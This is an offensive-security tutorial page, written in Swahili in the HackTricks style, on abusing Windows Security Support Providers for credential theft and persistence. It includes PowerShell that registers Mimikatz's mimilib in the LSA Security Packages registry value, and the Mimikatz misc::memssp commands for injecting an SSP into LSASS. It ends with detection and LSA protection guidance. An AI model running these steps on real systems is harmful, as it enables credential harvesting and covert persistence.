# Security Support Providers Maalum

{{#include ../../banners/hacktricks-training.md}}

[Security Support Providers (SSPs)](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi) ni vifurushi vya usalama vinavyotegemea DLL na kupakiwa na Local Security Authority (LSA). Windows husajili custom SSP/AP DLLs kupitia thamani ya `REG_MULTI_SZ` ya `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` na hupakia vifurushi vilivyosajiliwa mfumo unapoanza.<sup>[[1]](#references)</sup>

Kwa sababu SSPs huendeshwa ndani ya LSA na zinaweza kupokea credentials, attackers wanaweza kutumia kifurushi hasidi kwa credential access na persistence. MITRE hufuatilia tabia hii kama T1547.005.<sup>[[2]](#references)</sup>

## Mimikatz `mimilib`

Mimikatz inajumuisha `mimilib.dll`, ambayo hutekeleza SSP inayorekodi credentials zinazoshughulikiwa baada ya kupakiwa. Katika maabara iliyoidhinishwa, weka DLL inayolingana na architecture ya target katika `C:\Windows\System32`, kisha kagua orodha ya sasa ya vifurushi kabla ya kuibadilisha.<sup>[[2]](#references)[[3]](#references)</sup>
```powershell
$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$packages = (Get-ItemProperty -Path $lsaPath -Name 'Security Packages').'Security Packages'
$packages
```
Thamani iliyopo kwa kawaida inaweza kuwa na vifurushi kama `kerberos`, `msv1_0`, `schannel`, `wdigest`, `tspkg`, na `pku2u`. Hifadhi kila ingizo lililopo unapoongeza package maalum.<sup>[[1]](#references)</sup>

Ongeza `mimilib` mwishoni bila kubadilisha vifurushi vilivyopo:
```powershell
if ($packages -notcontains 'mimilib') {
Set-ItemProperty -Path $lsaPath -Name 'Security Packages' -Value ($packages + 'mimilib')
}
```
Baada ya kuwasha upya, package hupakiwa kwenye LSA, na credentials zinazokamatwa baadaye huandikwa kwenye `C:\Windows\System32\kiwissp.log` na implementation hii.<sup>[[2]](#references)[[3]](#references)</sup>

## Upakiaji wa In-memory

Mimikatz pia inaweza kuingiza implementation yake ya SSP kwenye mchakato wa sasa wa LSASS:<sup>[[3]](#references)</sup>
```text
privilege::debug
misc::memssp
```
Mbinu hii haidumu baada ya kuwasha upya mfumo.<sup>[[2]](#references)[[3]](#references)</sup>

## Utambuzi na Upunguzaji wa Hatari

Fuatilia mabadiliko kwenye `...\Lsa\Security Packages` na upakiaji usiotarajiwa wa DLL kwenye `lsass.exe`. Tukio la usalama 4657 hurekodi marekebisho ya **value** ya registry pekee wakati sera husika ya Audit Registry na SACL zimesanidiwa.<sup>[[2]](#references)[[4]](#references)</sup>

Inapooana, wezesha LSA protection ya ziada na chunguza SSP DLL ambazo hazijasainiwa au zisizotarajiwa. Microsoft inaeleza LSA protection kama udhibiti mahususi dhidi ya code injection ambayo inaweza kuhatarisha credentials.<sup>[[5]](#references)</sup>

## References

- [1] [Microsoft Learn - Kusajili SSP/AP DLLs](https://learn.microsoft.com/en-us/windows/win32/secauthn/registering-ssp-ap-dlls)
- [2] [MITRE ATT&CK T1547.005 - Security Support Provider](https://attack.mitre.org/techniques/T1547/005/)
- [3] [Hazina ya Mimikatz - `mimilib`](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib)
- [4] [Microsoft Learn - Tukio la usalama 4657](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
- [5] [Microsoft Learn - Sanidi LSA protection ya ziada](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
